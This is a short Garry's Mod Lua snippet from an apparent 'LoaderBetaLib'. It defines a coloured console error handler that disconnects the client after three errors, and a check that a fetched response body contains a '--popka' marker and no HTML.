local counttterr = 0
pcall ( function () function errorfolenorik(arg, arg2)
MsgC(Color( 141, 197, 113 ), "\n\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n")
MsgC( Color( 0, 144, 255 ), "[LoaderBetaLib] ", Color( 255, 74, 74 ), "Warning!! Code run Error\n")
if arg != nil then print(arg) else print(" - No arguments") end
if arg2 != nil then print("-----") print("More info: "..arg2) end
MsgC( Color( 0, 144, 255 ), "[LoaderBetaLib] ", Color( 255, 74, 74 ), "Fast fix it")
MsgC(Color( 141, 197, 113 ), "\n-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n")


if counttterr >= 3 then 
MsgC( Color( 0, 144, 255 ), "\n\n[LoaderBetaLib] ", Color( 255, 74, 74 ), "ЭКСТРЕННОЕ ОТКЛЮЧЕНИЕ ОТ СЕРВЕРА (3+ ОШИБКИ)\n\n")
RunConsoleCommand("disconnect") 
end

counttterr = counttterr + 1

timer.Create (  "counttttimeddsijrv" , 1 , 1 , function ( ) 
counttterr = 0
end)

end end)


pcall ( function () function checkssun(body, argur)
if not body or string.find(body, '<html>') or string.find(body, '<head>') or string.find(body, '<script>') or body == "" or !string.find(body, '--popka') then
errorfolenorik("R417", argur)
return false
else
return true
end
end end)


